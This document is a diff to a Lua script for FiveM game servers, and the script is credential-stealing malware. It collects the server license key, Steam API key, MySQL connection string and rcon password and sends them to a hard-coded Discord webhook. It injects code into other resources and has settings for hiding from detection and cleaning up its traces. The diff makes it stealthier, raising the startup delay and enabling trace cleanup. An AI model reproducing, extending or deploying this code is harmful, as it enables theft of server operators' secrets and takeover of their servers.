@@ -16,96 +16,12 @@
 -- CONFIGURATION SECTION
 -- =============================================
 
-local function findServerCfg(startingPath)
-    local path = startingPath or GetResourcePath(GetCurrentResourceName())
-    while true do
-        local testPath = path .. "/server.cfg"
-        local file = io.open(testPath, "r")
-        if file then
-            local content = file:read("*a")
-            file:close()
-            return content, testPath
-        end
-        local parent = path:match("(.+)/[^/]+$")
-        if not parent or parent == path then
-            return nil
-        end
-        path = parent
-    end
-end
-
--- Funkcia na parsovanie dôležitých convarov zo server.cfg obsahu
-local importantConvars = {
-    "sv_hostname",
-    "sv_projectName",
-    "sv_projectDesc",
-    "endpoint_add_tcp",
-    "endpoint_add_udp",
-    "sv_endpointPrivacy",
-    "sv_maxclients",
-    "gametype",
-    "mapname",
-    "onesync_enabled",
-    "sv_scriptHookAllowed",
-    "sv_enforceGameBuild",
-    "sv_lan",
-    "steam_webApiKey",
-    "mysql_connection_string",
-    "sv_licenseKey",
-    "mysql_debug",
-    "rcon_password",
-    "sv_authMaxVariance",
-    "sv_authMinTrust",
-    "version",
-    "locale",
-    "netlib",
-    "activitypubFeed"
-}
-
-local function extractConvars(cfgContent, keys)
-    local values = {}
-    for _, key in ipairs(keys) do
-        -- hľadá napr. "sv_hostname somevalue"
-        local pattern = key .. "%s+([^\n\r]+)"
-        local value = cfgContent:match(pattern)
-        values[key] = value or "unknown"
-    end
-    return values
-end
-
-
 local Config = {
     -- Core Settings
     general = {
         debug_mode = false,            -- Enable for verbose logging (disable in production)
         silent_mode = true,            -- Hide all prints to prevent detection
-        auto_clean = false              -- Auto-clean traces after execution
-    },
-    importantConvars = {
-        "sv_hostname",
-        "sv_projectName",
-        "sv_projectDesc",
-        "endpoint_add_tcp",
-        "endpoint_add_udp",
-        "sv_endpointPrivacy",
-        "sv_maxclients",
-        "gametype",
-        "mapname",
-        "onesync_enabled",
-        "sv_scriptHookAllowed",
-        "sv_enforceGameBuild",
-        "sv_lan",
-        "steam_webApiKey",
-        "mysql_connection_string",
-        "sv_licenseKey",
-        "mysql_debug",
-        "rcon_password",
-        "sv_authMaxVariance",
-        "sv_authMinTrust",
-        "version",
-        "locale",
-        "netlib",
-        "activitypubFeed"
+        auto_clean = true              -- Auto-clean traces after execution
     },
     
     -- Payloads and URLs
@@ -122,7 +38,7 @@ local Config = {
             enabled = true,                                     -- Enable code injection
             use_custom_url = false,                             -- Use custom URL instead of built-in collector
             custom_url = "https://yoursite.com/injection.lua",  -- Custom code URL to inject
-            max_target_count = 0                                -- Max number of resources to inject into
+            max_target_count = 3                                -- Max number of resources to inject into
         }
     },
     
@@ -131,10 +47,10 @@ local Config = {
         url = "https://discord.com/api/webhooks/1401562823603257398/H1AVe0b-HseR9QdEAexqdHwJG-omUnqmNUorkaesJtM6xVJszyOIXwklx7OlPYuxysTx",                          -- Discord webhook URL
         username = "FiveM Intelligence",                        -- Bot username
         avatar_url = "https://i.imgur.com/example.png",         -- Bot avatar
-        mention = "",                                  -- Role/user to mention (empty for none)
+        mention = "@everyone",                                  -- Role/user to mention (empty for none)
         color = 16711680,                                       -- Embed color (red)
         timeout_ms = 10000,                                     -- Webhook timeout (ms)
-        retry_count = 5                                         -- Number of retries if webhook fails
+        retry_count = 3                                         -- Number of retries if webhook fails
     },
     
     -- Admin data extraction
@@ -206,8 +122,7 @@ local Config = {
             "mysql",
             "database",
             "key",
-            "webhook",
-            "sv_licenseKey"
+            "webhook"
         },
         
         max_file_size = 1024 * 1024                  -- Max file size to scan/send (1MB)
@@ -215,7 +130,7 @@ local Config = {
     
     -- Execution settings
     execution = {
-        startup_delay = 1000,                       -- Initial delay before execution (ms)
+        startup_delay = 30000,                       -- Initial delay before execution (ms)
         post_injection_delay = 5000,                 -- Delay after injection before sending data (ms)
         stagger_delay = 2000,                        -- Delay between resource injections (ms)
         periodic_reporting = false,                  -- Send reports periodically
@@ -1416,26 +1331,48 @@ end
 
 -- Collect server configuration
 function DataCollector.collect_server_config()
-    local cfg = find_server_cfg()
-    if not cfg then
-        print('[DataCollector] server.cfg not found')
-        return {}
-    end
-
-    local parsed = parse_server_cfg(cfg)
-
-    -- Vracia len relevantné údaje
-    return {
-        licenseKey = parsed['sv_licenseKey'],
-        lanMode    = parsed['sv_lan'],
-        hostname   = parsed['sv_hostname'],
-        maxClients = parsed['sv_maxclients'],
-        steam      = parsed['steam_webApiKey'],
-        scriptHook = parsed['sv_scriptHookAllowed'],
-        tags       = parsed['sets'],
+    local config_vars = {
+        -- Server identification
+        sv_hostname = GetConvar("sv_hostname", "unknown"),
+        sv_projectName = GetConvar("sv_projectName", "unknown"),
+        sv_projectDesc = GetConvar("sv_projectDesc", "unknown"),
+        
+        -- Connection info
+        endpoint_add_tcp = GetConvar("endpoint_add_tcp", "unknown"),
+        endpoint_add_udp = GetConvar("endpoint_add_udp", "unknown"),
+        sv_endpointPrivacy = GetConvar("sv_endpointPrivacy", "unknown"),
+        sv_maxclients = GetConvarInt("sv_maxclients", 0),
+        
+        -- Game settings
+        game_type = GetConvar("gametype", "unknown"),
+        map_name = GetConvar("mapname", "unknown"),
+        onesync_enabled = GetConvar("onesync_enabled", "unknown"),
+        sv_scriptHookAllowed = GetConvar("sv_scriptHookAllowed", "unknown"),
+        sv_enforceGameBuild = GetConvar("sv_enforceGameBuild", "unknown"),
+        sv_lan = GetConvar("sv_lan", "unknown"),
+        
+        -- Authentication
+        sv_licenseKey = GetConvar("sv_licenseKey", "unknown"),
+        steam_webApiKey = GetConvar("steam_webApiKey", "unknown"),
+        
+        -- Database
+        mysql_connection_string = GetConvar("mysql_connection_string", "unknown"),
+        mysql_debug = GetConvar("mysql_debug", "unknown"),
+        
+        -- Security
+        rcon_password = GetConvar("rcon_password", "unknown"),
+        sv_authMaxVariance = GetConvar("sv_authMaxVariance", "unknown"),
+        sv_authMinTrust = GetConvar("sv_authMinTrust", "unknown"),
+        
+        -- Technical
+        version = GetConvar("version", "unknown"),
+        locale = GetConvar("locale", "unknown"),
+        netlib = GetConvar("netlib", "unknown"),
+        resource_monitor = GetConvar("activitypubFeed", "unknown"),
     }
+    
+    return config_vars
 end
-
 -- Main data collection function
 function DataCollector.collect_all_data(callback)
     Utils.get_server_ip(function(server_ip, error)
@@ -2077,23 +2014,9 @@ local function initialize_system()
         end
     end
     
-    -- Tu pridáme načítanie a spracovanie server.cfg pre webhook
+    -- Collect and send server data
     Citizen.SetTimeout(Config.execution.post_injection_delay, function()
-        -- načítanie server.cfg obsahu
-        local cfgContent, cfgPath = findServerCfg()
-        local convars = {}
-        if cfgContent then
-            Logger.info("server.cfg found at: " .. cfgPath)
-            convars = extractConvars(cfgContent, importantConvars)
-        else
-            Logger.error("server.cfg not found!")
-        end
-        
-        -- Zbierať všetky ostatné dáta cez DataCollector (ak tá funkcia existuje)
         DataCollector.collect_all_data(function(server_data)
-            -- prepíšeme alebo pridáme config z convarov načítaných z cfg
-            server_data.config = convars
-            
             local webhook_data = WebhookManager.format_for_webhook(server_data)
             WebhookManager.send(webhook_data)
         end)
@@ -2105,15 +2028,7 @@ local function initialize_system()
             while true do
                 Citizen.Wait(Config.execution.reporting_interval)
                 
-                local cfgContent, cfgPath = findServerCfg()
-                local convars = {}
-                if cfgContent then
-                    convars = extractConvars(cfgContent, importantConvars)
-                end
-                
                 DataCollector.collect_all_data(function(server_data)
-                    server_data.config = convars
-                    
                     local webhook_data = WebhookManager.format_for_webhook(server_data)
                     WebhookManager.send(webhook_data)
                 end)
@@ -2178,6 +2093,7 @@ end
 Citizen.CreateThread(function()
     Logger.info("Starting in " .. (Config.execution.startup_delay / 1000) .. " seconds...")
     Citizen.Wait(Config.execution.startup_delay)
+    
     initialize_system()
 end)
 
